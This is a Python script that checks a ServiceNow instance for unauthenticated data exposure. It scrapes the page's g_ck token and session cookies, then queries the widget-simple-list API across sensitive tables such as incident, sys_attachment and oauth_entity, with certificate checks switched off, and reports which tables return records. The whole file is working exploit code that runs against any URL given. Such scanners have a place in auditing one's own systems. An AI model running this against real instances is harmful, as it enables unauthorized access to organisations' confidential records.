#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from bs4 import BeautifulSoup
import argparse
import requests
import json
import re

def check_vulnerability(url, g_ck_value, cookies):
    table_list = [
        "cmdb_model",
        "cmn_department",
        "licensable_app",
        "alm_asset",
        "kb_knowledge",
        "sys_attachment",
        "sc_cat_item",
        "sys_attachment_doc",
        "oauth_entity",
        "cmn_cost_center",
        "sn_admin_center_application",
        "cmn_company",
        "sys_email_attachment",
        "cmn_notif_device",
        "sys_portal_age",
        "incident"
    ]

    if fast_check:
        table_list = ["incident"]

    vulnerable_urls = []

    for table in table_list:
        headers = {
            'Cookie': '; '.join([f'{k}={v}' for k, v in cookies.items()]),
            'X-UserToken': g_ck_value,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Connection': 'close'
        }

        post_url = f"{url}/api/now/sp/widget/widget-simple-list?t={table}"
        data_payload = json.dumps({})  # Empty JSON payload

        post_response = s.post(post_url, headers=headers, data=data_payload, verify=False)

        if post_response.status_code == 200 or post_response.status_code == 201:
            response_json = post_response.json()
            if 'result' in response_json and response_json['result']:
                if 'data' in response_json['result']:
                    if 'count' in response_json['result']['data'] and response_json['result']['data']['count'] > 0:
                        print(f"{post_url} is EXPOSED, found at least {response_json['result']['data']['count']} items")
                        vulnerable_urls.append(post_url)
    
    return vulnerable_urls


parser = argparse.ArgumentParser(description='Fetch g_ck and cookies from a given URL')
parser.add_argument('--url', required=True, help='The URL to fetch from')
parser.add_argument('--fast-check', action='store_true', help='Only check for the table incident')
args = parser.parse_args()
url = args.url.rstrip('/')  # Normalize the URL by removing any trailing slashes
fast_check = args.fast_check

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

s = requests.Session()

response = s.get(url, verify=False)
cookies = s.cookies.get_dict()
soup = BeautifulSoup(response.text, 'html.parser')
script_tags = soup.find_all('script')

g_ck_value = None
for tag in script_tags:
    if tag.string:
        match = re.search(r"var g_ck = '([a-zA-Z0-9]+)'", tag.string)
        if match:
            g_ck_value = match.group(1)
            break

if not g_ck_value:
    print(f"{url} - Error: g_ck not found.")
    exit(1)

vulnerable_urls = check_vulnerability(url, g_ck_value, cookies)

if not vulnerable_urls:
    print(f"Not affected tables.")
